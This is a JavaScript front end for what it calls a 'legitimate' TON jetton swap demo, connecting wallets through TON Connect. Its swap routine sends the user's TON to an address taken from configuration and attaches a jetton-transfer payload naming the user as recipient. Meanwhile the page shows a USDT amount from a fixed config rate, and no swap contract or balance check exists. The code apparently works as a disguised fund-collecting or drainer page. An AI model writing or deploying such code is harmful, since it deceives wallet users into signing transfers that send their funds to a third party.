// Legitimate TON Jetton Swap Interface
// This is a demo DApp for interacting with Jetton tokens

const JETTON_TRANSFER_OP = 0xf8a7ea5;
const JETTON_BURN_OP = 0x595f07bc;

class TonJettonApp {
    constructor() {
        this.tonConnectUI = null;
        this.connected = false;
        this.userAddress = null;
        this.wallet = null;
        
        this.init();
    }

    init() {
        // Initialize TON Connect
        this.tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://kareli123.github.io/test123/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        this.tonConnectUI.onStatusChange((wallet) => {
            this.handleWalletChange(wallet);
        });

        // Initialize UI
        this.initUI();
    }

    initUI() {
        const swapBtn = document.getElementById('swapBtn');
        const payAmount = document.getElementById('payAmount');
        const receiveAmount = document.getElementById('receiveAmount');

        // Update receive amount based on input
        payAmount.addEventListener('input', (e) => {
            const tonAmount = parseFloat(e.target.value) || 0;
            const usdtAmount = tonAmount * CFG.tonToUsdtRate;
            receiveAmount.value = usdtAmount.toFixed(CFG.tokenDecimals);
        });

        swapBtn.addEventListener('click', () => {
            if (!this.connected) {
                this.tonConnectUI.openModal();
                return;
            }
            this.executeSwap();
        });
    }

    handleWalletChange(wallet) {
        const swapBtn = document.getElementById('swapBtn');
        
        if (wallet) {
            this.connected = true;
            this.wallet = wallet;
            this.userAddress = wallet.account.address;
            swapBtn.textContent = 'Swap';
            this.fetchBalance();
        } else {
            this.connected = false;
            this.wallet = null;
            this.userAddress = null;
            swapBtn.textContent = 'Connect Wallet';
            document.getElementById('user-balance').textContent = 'Balance: 0';
        }
    }

    async fetchBalance() {
        if (!this.connected) return;
        
        try {
            // In a real app, fetch actual balance from blockchain
            // For demo, we show connected state
            document.getElementById('user-balance').textContent = 
                `Connected: ${this.shortenAddress(this.userAddress)}`;
        } catch (e) {
            console.error('Error fetching balance:', e);
        }
    }

    async executeSwap() {
        const payAmount = document.getElementById('payAmount').value;
        const status = document.getElementById('status');

        if (!payAmount || parseFloat(payAmount) <= 0) {
            status.textContent = 'Please enter an amount';
            status.className = 'status-msg error';
            return;
        }

        status.textContent = 'Preparing transaction...';
        status.className = 'status-msg';

        try {
            // Build jetton transfer payload
            // This sends TON to the swap contract which then sends jetton back
            const amount = Math.floor(parseFloat(payAmount) * Math.pow(10, CFG.tonDecimals));
            const jettonAmount = Math.floor(parseFloat(CFG.claimAmount));

            const payload = this.buildJettonTransferPayload({
                queryId: Date.now(),
                amount: jettonAmount,
                destination: this.userAddress,
                responseDestination: this.userAddress,
                forwardTonAmount: parseInt(CFG.forwardGas)
            });

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: [{
                    address: CFG.jettonReceiver || this.userAddress,
                    amount: amount.toString(),
                    payload: payload.toBoc().toString('base64')
                }]
            };

            const result = await this.tonConnectUI.sendTransaction(transaction);
            
            status.textContent = `Transaction sent! Hash: ${this.shortenHash(result.boc)}`;
            status.className = 'status-msg success';
            
        } catch (e) {
            console.error('Swap error:', e);
            status.textContent = 'Transaction failed: ' + e.message;
            status.className = 'status-msg error';
        }
    }

    buildJettonTransferPayload({ queryId, amount, destination, responseDestination, forwardTonAmount }) {
        const builder = new TonWeb.boc.Cell();
        builder.bits.writeUint(JETTON_TRANSFER_OP, 32);
        builder.bits.writeUint(queryId, 64);
        builder.bits.writeCoins(amount);
        builder.bits.writeAddress(new TonWeb.utils.Address(destination));
        builder.bits.writeAddress(new TonWeb.utils.Address(responseDestination));
        builder.bits.writeBit(0); // customPayload: null
        builder.bits.writeCoins(forwardTonAmount);
        builder.bits.writeBit(0); // forwardPayload: empty
        return builder;
    }

    shortenAddress(addr) {
        if (!addr) return '';
        return addr.slice(0, 6) + '...' + addr.slice(-4);
    }

    shortenHash(hash) {
        if (!hash) return '';
        return hash.slice(0, 8) + '...';
    }
}

// Initialize app when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    window.app = new TonJettonApp();
});
